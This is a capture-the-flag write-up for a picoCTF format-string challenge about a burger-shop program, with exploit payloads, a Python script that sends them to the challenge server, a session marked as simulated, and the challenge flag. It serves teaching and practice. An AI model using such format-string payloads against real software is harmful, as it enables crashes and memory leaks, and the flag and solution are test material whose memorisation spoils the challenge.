# Challenge Description
Description: Can you use your knowledge of format strings to make the customers happy?
Download the binary here.
Download the source here.
Additional details will be available after launching your challenge instance.

## Solution
The program simulates a burger shop with two customers (Patrick and Bob). A flag buffer is read from flag.txt at program start and a custom SIGSEGV handler prints it:
```
void sigsegv_handler(int sig)
{
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}
Key vulnerable lines:
scanf("%s", choice1);
int count = printf(choice1);
if (count > 2 * BUFSIZE) { serve_bob(); }
...
scanf("%s", choice2);
printf(choice2);
Both printf(choice1) and printf(choice2) pass user input directly as the format string → format string vulnerability.
```


Use a first input that is a valid menu item but contains a format specifier that makes printf print many characters (so count > 64) to reach the second stage (serve_bob()).
In the second stage, provide a string with %s/other format specifiers so printf tries to dereference invalid pointers and causes a segmentation fault. The SIGSEGV handler then prints the flag.
Candidate payloads discovered from source menus:

```
Patrick’s menu contains Gr%114d_Cheese — %114d will expand and print many characters.
Bob’s menu contains Cla%sic_Che%s%steak — multiple %s will read memory as pointers and likely crash.
Steps to reproduce (manual)
Launch the service locally or connect to the remote instance:

Local: ./burger (ensure flag.txt is present)
Remote: nc mimas.picoctf.net 53816
When prompted for the first customer, enter:

Gr%114d_Cheese
This causes printf(choice1) to print >64 chars, so the program calls serve_bob().

When prompted for the second customer, enter:
Cla%sic_Che%s%steak
This should cause printf(choice2) to dereference bad memory and trigger a SIGSEGV. The SIGSEGV handler prints the flag buffer.
```

Automated exploit (short Python)
Save this as get_flag_short.py and run with python3 get_flag_short.py.

#!/usr/bin/env python3
# Minimal script to interact with remote challenge
```
import socket, time
HOST, PORT = "mimas.picoctf.net", 53816
P1, P2 = b"Gr%114d_Cheese\n", b"Cla%sic_Che%s%steak\n"
def recv_all(s, timeout=5):
    s.settimeout(0.5); end=time.time()+timeout; out=b""
    while time.time()<end:
        try: c=s.recv(4096)
        except socket.timeout: continue
        if not c: break
        out+=c
    return out
with socket.create_connection((HOST, PORT), timeout=8) as s:
    print(recv_all(s,3).decode(errors="ignore"), end="")
    s.sendall(P1); time.sleep(0.2)
    print(recv_all(s,3).decode(errors="ignore"), end="")
    s.sendall(P2)
    print(recv_all(s,4).decode(errors="ignore"), end="")
Example terminal session (EXPECTED / SIMULATED)
$ nc mimas.picoctf.net 53816
Welcome to our newly-opened burger place Pico 'n Patty!
Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers:
Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese

Good job! Patrick is happy!
Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop
Enter your recommendation: Cla%sic_Che%s%steak
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```
## Flag:
```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```
## Concepts learnt:
Format String Vulnerabilities: Passing user input directly as the printf format string allows attackers to use % specifiers to read or write arbitrary memory, leak data, or cause crashes.
SIGSEGV Handler Abuse: The program registers a SIGSEGV handler that prints sensitive data.
Automating interactions: Using Python socket or pwntools to interact with remote services.

## Notes:
Why %114d? %Nd prints to a width of N characters, which helps satisfy the count > 64 check.
Triggering SIGSEGV with %s: %s expects a pointer; invalid pointers can cause a crash.
Alternative tangents: Could try %x/%p to leak memory or %n to write, but crashing was the simplest path here.

## Resources:
Format string primer and example writeups.
